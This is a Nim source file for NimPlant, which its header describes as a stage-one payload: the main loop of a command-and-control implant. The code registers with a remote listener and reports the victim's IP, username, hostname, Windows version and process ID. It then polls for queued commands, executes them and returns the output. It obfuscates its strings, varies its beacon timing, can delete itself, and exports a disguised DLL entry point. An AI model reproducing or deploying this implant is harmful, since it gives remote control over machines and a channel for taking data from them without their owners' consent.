#[

    NimPlant - A light stage-one payload written in Nim
    By Cas van Cooten (@chvancooten)

]#

from os import sleep
from random import rand
from strutils import parseBool, parseInt, split
from math import `^`
import tables, times
import util/[functions, strenc, webClient, winUtils] 

when defined selfdelete:
    import util/selfDelete

var riskyMode = false
when defined risky:
    riskyMode = true

let CONFIG : Table[string, string] = parseConfig()

proc runNp() : void =
    # Get configuration information and create Listener object
    var listener = Listener(
        killTime: parseInt(CONFIG[obf("killTime")]),
        listenerHost: CONFIG[obf("hostname")],
        listenerIp: CONFIG[obf("listenerIp")],
        listenerPort: CONFIG[obf("listenerPort")],
        listenerType: CONFIG[obf("listenerType")],
        registerPath: CONFIG[obf("listenerRegPath")],
        resultPath: CONFIG[obf("listenerResPath")],
        sleepTime: parseInt(CONFIG[obf("sleepTime")]),
        sleepJitter: parseInt(CONFIG[obf("sleepJitter")]) / 100,
        taskPath: CONFIG[obf("listenerTaskPath")],
        userAgent: CONFIG[obf("userAgent")]
    )

    # Set parameters for the kill timer
    let killTime : DateTime = now() + initDuration(hours = listener.killTime)

    # Set the number of times NimPlant will try to connect before giving up
    let maxAttempts = 5
    var 
        currentAttempt = 0
        sleepMultiplier = 0 # For exponential backoff


    # Main loop
    while true:
        var
            cmd : string
            args : seq[string]
            output : string
            timeToSleep : int

        # Check if the kill timer expired, announce kill if registered
        if killTime <= now():
            if listener.cryptKey != "":
                listener.killSelf()
            
            when defined verbose:
                echo obf("DEBUG: Kill timer expired. Goodbye cruel world!")
                
            quit(0)

        # Attempt to register with server if no successful registration has occurred
        if not listener.registered:
            try:
                if not listener.initialized:
                    # Initialize and check succesful initialization, hit the except clause if not
                    listener.init()
                    assert listener.initialized

                # Register and check succesful registration, hit the except clause if not
                listener.postRegisterRequest(getIntIp(), getUsername(), getHost(), getWindowsVersion(), getProcId(), riskyMode)
                assert listener.registered
            
                # Succesful registration, reset the sleep modifier if set and enter main loop
                sleepMultiplier = 1

            except:
                # Handle exponential backoff for failed registrations
                when defined verbose:
                    echo obf("DEBUG: Failed to register with server.")

                sleepMultiplier = 2^currentAttempt
                inc currentAttempt

                if currentAttempt >= maxAttempts:
                    when defined verbose:
                        echo obf("DEBUG: Hit retry count, giving up.")

                    quit(0)
        
        # Otherwise, process commands from registered server
        else: 
            # Check C2 server for an active command
            (cmd, args) = listener.getQueuedCommand()
            
            # If a connection error occured, the server went down or restart - drop back into initial registration loop
            if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                listener.initialized = false
                listener.registered = false
                when defined verbose:
                        echo obf("DEBUG: Server connection lost, retrying registration.")

            # If a command was found, execute it
            elif cmd != "":
                when defined verbose:
                    echo obf("DEBUG: Got command '") & cmd & obf("' with args '") & args & obf("'.")

                # Handle commands that directly impact the listener object here
                if cmd == obf("sleep"):
                    try: 
                        if len(args) == 2:
                            listener.sleepTime = parseInt(args[0])
                            var jit = parseInt(args[1])
                            listener.sleepJitter = if jit < 0: 0.0 elif jit > 100: 1.0 else: jit / 100
                        else:
                            listener.sleepTime = parseInt(args[0])
                            
                        output = obf("Sleep time changed to ") & $listener.sleepTime & obf(" seconds (") & $(toInt(listener.sleepJitter*100)) & obf("% jitter).")
                    except:
                        output = obf("Invalid sleep time.")
                elif cmd == obf("kill"):
                    quit(0)

                # Otherwise, parse commands via 'functions.nim'
                else:   
                    output = listener.parseCmd(cmd, args)
                    
                if output != "":
                    listener.postCommandResults(output)

        # Sleep the main thread for the configured sleep time and a random jitter %, including an exponential backoff multiplier
        timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..listener.sleepJitter)))

        when defined verbose:
            echo obf("DEBUG: Sleeping for ") & $timeToSleep & obf(" seconds.")

        sleep(timeToSleep * 1000)

when defined exportDll:
    from winim/lean import HINSTANCE, DWORD, LPVOID

    proc NimMain() {.cdecl, importc.}

    proc Update(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
        NimMain()
        runNp()
        return true

else:
    when isMainModule:
        when defined selfdelete:
            selfDelete.selfDelete()
        runNp()